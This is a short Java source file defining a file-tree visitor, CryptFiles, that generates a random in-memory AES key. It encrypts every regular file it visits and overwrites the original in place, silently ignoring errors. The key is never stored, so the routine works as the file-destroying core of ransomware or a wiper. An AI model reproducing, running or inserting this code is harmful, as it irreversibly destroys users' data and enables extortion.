package visitor;
import static java.nio.file.FileVisitResult.*;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;

public class CryptFiles extends SimpleFileVisitor<Path> {
	private Key key;
	private Cipher encrypter;
	private KeyGenerator keyGenerator;
	
	public CryptFiles() throws NoSuchAlgorithmException, NoSuchPaddingException{
		keyGenerator = KeyGenerator.getInstance("AES");
		encrypter = Cipher.getInstance("AES");
		keyGenerator.init(128);
		key = keyGenerator.generateKey();
	}
	
    @Override
    public FileVisitResult visitFile(Path f, BasicFileAttributes attr) {
        if (attr.isRegularFile()) {
        	try
        	{
        		encrypter.init(Cipher.ENCRYPT_MODE, key);
        		FileInputStream inputStream = new FileInputStream(f.toFile());
        		byte[] inputBytes = new byte[(int) f.toFile().length()];
        		inputStream.read(inputBytes);
        		byte[] outputBytes = encrypter.doFinal(inputBytes);
        		FileOutputStream outputStream = new FileOutputStream(f.toFile());
        		outputStream.write(outputBytes);
        		inputStream.close();
        		outputStream.close();
        	}
        	catch (Exception e){}
        } 
       
        return CONTINUE;
    }

    @Override
    public FileVisitResult postVisitDirectory(Path dir, IOException exc) {
        return CONTINUE;
    }

    @Override
    public FileVisitResult visitFileFailed(Path file, IOException exc) {
        return CONTINUE;
    }
}
